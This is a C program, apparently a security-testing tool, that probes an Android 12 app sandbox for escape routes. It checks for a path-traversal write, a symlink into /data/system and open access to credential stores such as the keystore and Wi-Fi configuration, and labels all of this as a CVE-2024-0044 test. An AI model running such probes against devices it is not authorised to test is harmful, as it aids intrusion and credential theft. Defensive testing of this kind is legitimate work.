/*
 * CVE-2024-0044 run-as Sandbox Escape Test
 *
 * Vulnerability: Android run-as command path traversal
 * Target: Debuggable applications on Android 12
 *
 * This tool tests if the run-as command can be exploited
 * to escape the app sandbox via path traversal or race conditions.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <errno.h>
#include <dirent.h>
#include <pwd.h>

#define TARGET_APP "com.cooper.wheellog.debug"

void banner(void)
{
    printf("===========================================\n");
    printf("CVE-2024-0044 run-as Sandbox Escape Test\n");
    printf("Target app: %s\n", TARGET_APP);
    printf("===========================================\n\n");
}

/* Test 1: Check current context and capabilities */
void test_context(void)
{
    printf("[TEST 1] Current context:\n");

    uid_t uid = getuid();
    gid_t gid = getgid();

    printf("  UID: %d\n", uid);
    printf("  GID: %d\n", gid);
    printf("  EUID: %d\n", geteuid());
    printf("  EGID: %d\n", getegid());

    /* Read SELinux context */
    int fd = open("/proc/self/attr/current", O_RDONLY);
    if (fd >= 0)
    {
        char ctx[256] = {0};
        read(fd, ctx, sizeof(ctx) - 1);
        printf("  SELinux: %s", ctx);
        close(fd);
    }
    printf("\n");
}

/* Test 2: Check accessible paths */
void test_accessible_paths(void)
{
    printf("[TEST 2] Path accessibility:\n");

    const char *paths[] = {
        "/data/local/tmp",
        "/data/data",
        "/data/data/" TARGET_APP,
        "/data/user/0",
        "/system",
        "/system/bin",
        "/proc",
        "/proc/1",
        "/sys/kernel",
        "/dev",
        "/dev/binder",
        NULL};

    for (int i = 0; paths[i]; i++)
    {
        int can_read = (access(paths[i], R_OK) == 0);
        int can_write = (access(paths[i], W_OK) == 0);
        int can_exec = (access(paths[i], X_OK) == 0);

        printf("  %s: R%c W%c X%c\n",
               paths[i],
               can_read ? '+' : '-',
               can_write ? '+' : '-',
               can_exec ? '+' : '-');
    }
    printf("\n");
}

/* Test 3: List files in app data directory */
void test_app_data(void)
{
    printf("[TEST 3] App data directory:\n");

    char path[256];
    snprintf(path, sizeof(path), "/data/data/%s", TARGET_APP);

    DIR *dir = opendir(path);
    if (!dir)
    {
        printf("  Cannot open: %s\n", strerror(errno));
        printf("\n");
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL)
    {
        if (entry->d_name[0] == '.')
            continue;

        char fullpath[512];
        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);

        struct stat st;
        if (stat(fullpath, &st) == 0)
        {
            printf("  %s %s\n",
                   S_ISDIR(st.st_mode) ? "[D]" : "[F]",
                   entry->d_name);
        }
    }
    closedir(dir);
    printf("\n");
}

/* Test 4: Try to write files in various locations */
void test_write_escape(void)
{
    printf("[TEST 4] Write escape attempts:\n");

    struct
    {
        const char *path;
        const char *desc;
    } targets[] = {
        {"/data/local/tmp/test_write", "tmp dir"},
        {"/data/data/" TARGET_APP "/test_write", "app data"},
        {"/data/data/" TARGET_APP "/cache/test_write", "app cache"},
        {"/data/data/" TARGET_APP "/../test_escape", "path traversal"},
        {"/data/data/test_escape", "outside sandbox"},
        {NULL, NULL}};

    for (int i = 0; targets[i].path; i++)
    {
        int fd = open(targets[i].path, O_CREAT | O_WRONLY, 0644);
        if (fd >= 0)
        {
            write(fd, "test", 4);
            close(fd);
            printf("  [SUCCESS] %s: %s\n", targets[i].desc, targets[i].path);
            unlink(targets[i].path);
        }
        else
        {
            printf("  [FAILED] %s: %s (%s)\n",
                   targets[i].desc, targets[i].path, strerror(errno));
        }
    }
    printf("\n");
}

/* Test 5: Check for sensitive file access */
void test_sensitive_access(void)
{
    printf("[TEST 5] Sensitive file access:\n");

    const char *files[] = {
        "/data/system/packages.xml",
        "/data/misc/keystore/persistent.sqlite",
        "/data/misc/wifi/WifiConfigStore.xml",
        "/data/system/users/0/settings_ssaid.xml",
        "/data/data/com.android.providers.settings/databases/settings.db",
        NULL};

    for (int i = 0; files[i]; i++)
    {
        int fd = open(files[i], O_RDONLY);
        if (fd >= 0)
        {
            printf("  [READABLE!] %s\n", files[i]);
            close(fd);
        }
        else
        {
            printf("  [Blocked] %s\n", files[i]);
        }
    }
    printf("\n");
}

/* Test 6: Check symlink capabilities */
void test_symlink_escape(void)
{
    printf("[TEST 6] Symlink escape attempts:\n");

    char linkpath[256];
    snprintf(linkpath, sizeof(linkpath), "/data/data/%s/cache/link_test", TARGET_APP);

    /* Try to create symlink to sensitive location */
    unlink(linkpath);
    if (symlink("/data/system", linkpath) == 0)
    {
        printf("  [SUCCESS] Created symlink to /data/system\n");

        /* Try to access through symlink */
        char target[256];
        snprintf(target, sizeof(target), "%s/packages.xml", linkpath);
        int fd = open(target, O_RDONLY);
        if (fd >= 0)
        {
            printf("  [VULN!] Can read through symlink!\n");
            close(fd);
        }
        else
        {
            printf("  [Blocked] Cannot follow symlink\n");
        }
        unlink(linkpath);
    }
    else
    {
        printf("  [FAILED] Cannot create symlink: %s\n", strerror(errno));
    }
    printf("\n");
}

/* Test 7: Process inspection capabilities */
void test_process_info(void)
{
    printf("[TEST 7] Process information access:\n");

    /* Read /proc/self/maps */
    FILE *f = fopen("/proc/self/maps", "r");
    if (f)
    {
        printf("  /proc/self/maps readable (ASLR info)\n");

        char line[256];
        int count = 0;
        while (fgets(line, sizeof(line), f) && count < 3)
        {
            printf("    %s", line);
            count++;
        }
        fclose(f);
    }

    /* Check if we can read other process info */
    DIR *proc = opendir("/proc");
    if (proc)
    {
        struct dirent *entry;
        int readable_pids = 0;

        while ((entry = readdir(proc)) != NULL)
        {
            if (entry->d_name[0] >= '0' && entry->d_name[0] <= '9')
            {
                char path[64];
                snprintf(path, sizeof(path), "/proc/%s/cmdline", entry->d_name);
                int fd = open(path, O_RDONLY);
                if (fd >= 0)
                {
                    readable_pids++;
                    close(fd);
                }
            }
        }
        closedir(proc);
        printf("  Readable PIDs in /proc: %d\n", readable_pids);
    }
    printf("\n");
}

/* Test 8: Check for binder access */
void test_binder_access(void)
{
    printf("[TEST 8] Binder access check:\n");

    const char *binder_devs[] = {
        "/dev/binder",
        "/dev/hwbinder",
        "/dev/vndbinder",
        NULL};

    for (int i = 0; binder_devs[i]; i++)
    {
        int fd = open(binder_devs[i], O_RDWR);
        if (fd >= 0)
        {
            printf("  [OPEN] %s (fd=%d)\n", binder_devs[i], fd);
            close(fd);
        }
        else
        {
            printf("  [Denied] %s\n", binder_devs[i]);
        }
    }
    printf("\n");
}

int main(void)
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    banner();

    test_context();
    test_accessible_paths();
    test_app_data();
    test_write_escape();
    test_sensitive_access();
    test_symlink_escape();
    test_process_info();
    test_binder_access();

    printf("===========================================\n");
    printf("Sandbox escape test complete\n");
    printf("===========================================\n");

    return 0;
}
